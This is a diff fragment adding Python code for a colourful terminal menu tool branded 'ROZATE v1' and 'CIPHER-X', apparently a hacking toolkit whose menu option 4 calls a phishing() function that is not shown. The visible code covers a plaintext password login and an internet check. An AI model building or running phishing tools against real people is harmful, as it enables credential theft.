+		if Enter == "4":
+			phishing()
+		if Enter == "0" or Enter == "00":
+			sys("clear")
+			print("\033[31mCIPHER \033[37m- \033[32mX")
+			exit()
+		else:
+			print("\033[32mCommand Not Find\033[31m !")
+			time(0.99)
+			return index()
+
+	except KeyboardInterrupt:
+		sys("clear")
+		print("\033[36mClosed \033[32mTools \033[31m?")
+		return_tools = str(input("\033[36mY\033[31m/\033[36mN \033[37m: "))
+		if return_tools == "Y" or return_tools == "y":
+			exit()
+		elif return_tools == "n" or return_tools == "N":
+			return internet()
+def check():
+	try:
+		check = os.path.isfile(r'.login.txt')
+		if check == True:
+			sys("clear")
+			print("\033[32mROZATE \033[34m- \033[31mv1\n\n\033[37m[\033[32m LOGIN\033[37m ]\n")
+			password_Login = str(input("\033[32mPASSWORD\033[31m : "))
+			if password_Login == open(".login.txt").read():
+				index()
+			else:
+				sys('clear')
+				time(0.77)
+				print("""\033[31m
+██████╗  █████╗ ███████╗███████╗
+██╔══██╗██╔══██╗██╔════╝██╔════╝
+██████╔╝███████║███████╗███████╗
+██╔═══╝ ██╔══██║╚════██║╚════██║
+██║     ██║  ██║███████║███████║
+╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
+""")
+				print("\033[32mROZATE \033[34m- \033[31mv1\n")
+				print("\033[32mPassWord Not Find\033[31m!")
+				time(0.72)
+				return internet()
+		if check == False:
+			sys('clear')
+			print("""\033[32m 
+██████╗  █████╗ ███████╗███████╗
+██╔══██╗██╔══██╗██╔════╝██╔════╝
+██████╔╝███████║███████╗███████╗
+██╔═══╝ ██╔══██║╚════██║╚════██║
+██║     ██║  ██║███████║███████║
+╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
+""")
+			print("\033[32mROZATE \033[34m- \033[31mv1\n")
+			password_new = str(input("\033[32mEnter Password New \033[31m: "))	
+			open(".login.txt","+a").write(password_new)
+			time(1)
+			index()
+	except KeyboardInterrupt:
+		pass
+def internet():
+	try:
+		send_check = requests.post("https://time.ir").status_code
+		try:
+			if send_check == 200:
+				check()
+			else:
+				sys("clear")
+				print("\033[32mYour Internet Not \033[31mConnected\n\n\033[32mCtrl \033[31m+\033[32m X\nSTATUS : \033[34m{}".format(send_check))
+				time(2)
+				return internet()
+		except requests.exceptions.ConnectionError:
+			sys("clear")
+			print("""\033[31m
+
+ ██████╗██╗██████╗ ██╗  ██╗███████╗██████╗      ██╗  ██╗
+██╔════╝██║██╔══██╗██║  ██║██╔════╝██╔══██╗     ╚██╗██╔╝
+██║     ██║██████╔╝███████║█████╗  ██████╔╝█████╗╚███╔╝ 
+██║     ██║██╔═══╝ ██╔══██║██╔══╝  ██╔══██╗╚════╝██╔██╗ 
+╚██████╗██║██║     ██║  ██║███████╗██║  ██║     ██╔╝ ██╗
+ ╚═════╝╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝     ╚═╝  ╚═╝
+\033[32m\nError Internet\033[31m!                                                        
+			""")
+	except KeyboardInterrupt:
+		pass
+internet()
